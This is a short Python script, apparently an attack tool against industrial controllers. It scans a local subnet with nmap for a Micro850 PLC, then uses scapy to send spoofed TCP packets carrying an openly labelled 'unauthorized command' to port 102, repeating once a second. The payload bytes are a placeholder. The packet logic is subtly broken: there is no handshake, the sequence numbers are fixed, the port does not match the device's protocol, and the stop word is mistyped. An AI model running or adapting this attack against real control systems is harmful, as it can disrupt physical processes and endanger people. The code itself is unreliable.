import subprocess
from scapy.all import *
import time
import threading
import random

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def send_unauthorized_command(plc_ip, command):
    try:
        # Create a packet with the unauthorized command
        packet = IP(src='192.168.1.100', dst=plc_ip)/TCP(dport=102, flags='PA', seq=12345, ack=67890)/Raw(load=command)
        
        # Send the packet
        send(packet, verbose=0)
        print(f"Sent unauthorized command: {command}")
    except Exception as e:
        print(f"Failed to send unauthorized command: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Define the unauthorized command
        command = b'\x01\x02\x03\x04'  # Replace with the actual command bytes
        
        # Ask for confirmation before sending the unauthorized command
        confirmation = input("Are you sure you want to send an unauthorized command? (yes/no): ")
        if confirmation.lower() == 'yes':
            # Send the unauthorized command in a loop
            while True:
                send_unauthorized_command(plc_ip, command)
                time.sleep(1)  # Send the command every second
                user_input = input("Type 'top' to stop sending the command: ")
                if user_input.lower() == 'top':
                    break
        else:
            print("Unauthorized command cancelled.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()